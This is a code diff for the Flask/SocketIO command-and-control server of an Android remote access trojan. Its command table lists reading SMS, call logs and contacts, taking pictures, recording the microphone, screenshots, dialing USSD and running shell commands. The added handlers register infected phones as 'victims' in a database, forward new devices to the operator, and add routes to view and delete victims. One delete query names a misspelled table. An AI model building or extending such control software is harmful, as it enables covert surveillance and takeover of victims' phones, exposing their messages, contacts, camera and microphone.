@@ -16,14 +16,18 @@ socketio = SocketIO(app)
 0x0 - Send SMS
 0x1 - Read SMS
 0x2 - Read Call Log
-0x3 - Read Contacts
-0x4 - Write Contact
-0x5 - Screenshot
-0x6 - Get Camera List
-0x7 - Take Picture
-0x8 - Record Mic
-0x9 - sh Command
-0xA - List Installed Apps
+0x3 - Make Phone Call
+0x4 - Dial USSD (API 26+)
+0x5 - Read Contacts
+0x6 - Write Contact
+0x7 - Screenshot
+0x8 - Get Camera List
+0x9 - Take Picture
+0xA - Record Mic
+0xB - sh Command
+0xC - List Installed Apps
+0xD - Vibrate Phone
+0xE - Change Wallpaper
 '''
 
 commands = [
@@ -37,12 +41,17 @@ commands = [
     "0x7",
     "0x8",
     "0x9",
-    "0xA"
+    "0xA",
+    "0xB",
+    "0xC",
+    "0xD",
+    "0xE",
 ]
 
+
+# Connection from C2
 @socketio.on('connect')
 def test_connect():
-    # take note of where connnection is coming from
     with open('server_soc_id.txt', 'w') as f:
         f.write(request.sid)
     emit('after connect',  {'data':'Session starting ...'})
@@ -53,73 +62,60 @@ def test_connect():
         record = cur.fetchall()
         con.close()
         if record.__len__() != 0:
-            emit("victims", record)
+            emit("victims", {'data' : record})
         else:
-            emit("victims", "None")
+            emit("victims", {'data' : 'None'})
     except sqlite3.Error as error:
         print("something went wrong")
+
+
+# Connection from android
+@socketio.on('android_connect')
+def value_changed(data):
+    print(data)
+    try:
+        con = sqlite3.connect("database.db")
+        cur = con.cursor()
+        cur.execute("SELECT * FROM victim WHERE deviceid= ?", (data['device_id'],))
+        record = cur.fetchall()
+        if record.__len__() == 0:
+            cur.execute(
+                "INSERT INTO victim(model, deviceid, ipaddress, api, socketid) VALUES(?, ?, ?, ?, ?)",
+                (
+                    data['model'],
+                    data['device_id'],
+                    request.remote_addr,
+                    data['api'],
+                    request.sid
+                )
+            )
+            con.commit()
+        else:
+            if record[5] != request.sid:
+                cur.execute("UPDATE victim SET socketid= ? WHERE deviceid=?", (request.sid, data['device_id']))
+                con.commit()
+        sid = ""
+        with open('server_soc_id.txt', 'r') as f:
+            sid = f.read()
+        emit("new_device", {
+                'model': data['model'],
+                'deviceid' : data['device_id'],
+                'ipaddress' : request.remote_addr,
+                'api' : data['api'],
+                'socketid' : request.sid
+            }, to= sid
+        )
+        con.close()
+    except sqlite3.Error as error:
+        print(error)
+
+    # emit('android value', message, broadcast=True,)
 
 
 @socketio.on('Slider value changed')
 def value_changed(message):
     print(message['data'])
     emit('update value', message, broadcast=True,)
-
-@socketio.on('android')
-def value_changed(message):
-    print(message)
-    emit('android value', message, broadcast=True,)
-
-# @socketio.on("fetch_victim")
-# def fetch_victim_details(id):
-#     try:
-#         con = sqlite3.connect("database.db")
-#         cur = con.cursor()
-#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
-#         record = cur.fetchall()
-#         con.close()
-#         emit("add_victim", record)
-#     except sqlite3.Error as error:
-#         # do something
-
-
-
-
-# @socketio.on("victim_connect")
-# def victim_connect(details):
-#     try:
-#         con = sqlite3.connect("database.db")
-#         cur = con.cursor()
-#         cur.execute(
-#             "INSERT INTO victim(device-id, client-id, ip-address, imei, os, network, location) VALUES(?, ?, ?, ?, ?, ?, ?)",
-#             (
-#                 details['device-id'],
-#                 details['client-id'],
-#                 details['ip-address'],
-#                 details['imei'],
-#                 details['os'],
-#                 details['network'],
-#                 details['location'],
-#             )
-#         )
-#         con.commit()
-#         con.close()
-#         # emit to c&c
-#         emit("new_device", "device id")
-#     except sqlite3.Error as error:
-#         # do something
-
-# @socketio.on("pong")
-# def reply(msg):
-#     print(msg)
-
-# def get_ccid():
-#     ccid = ""
-#     with open("ccid.txt", "r") as id:
-#         ccid = id.read()
-#     return ccid
-
-
 
 
 
@@ -230,6 +226,37 @@ def log():
             return redirect("/login", code=302)
     else:
         return render_template("error_page.html", log= ["400", "Bad Request"]), 400
+
+@app.route("/clients", methods=['POST'])
+def clients():
+    if request.method == 'POST':
+        if 'username' in session:
+            return jsonify({'htmlresponse': render_template("victim.html", data= [request.form['model'], request.form['device-id'], request.form['ip-address'], 'imei', request.form['api'], 'location'])}), 200
+        else:
+            return redirect("/login", code=302)
+    else:
+        return render_template("error_page.html", code= ["400", "Bad Request"]), 400
+
+@app.route("/deleteclient", methods=['POST'])
+def delete_client():
+    if request.method == 'POST':
+        if 'username' in session:
+            try:
+                con = sqlite3.connect("database.db")
+                cur = con.cursor()
+                cur.execute("SELECT deviceid FROM victim WHERE deviceid= ?", (request.form['deviceid'],))
+                record = cur.fetchall()
+                if record.__len__() != 0:
+                    cur.execute("DELETE FROM vitcim WHERE deviceid= ?", (request.form['deviceid'],))
+                    con.commit()
+                con.close()
+                return jsonify({"status" : "Record deleted"}), 200
+            except sqlite3.Error as error:
+                return "Deletion failed", 304
+        else:
+            return redirect("/login", code=302)
+    else:
+        return render_template("error_page.html", code= ["400", "Bad Request"]), 400  
 
 @app.route("/files", methods=['GET'])
 def files():
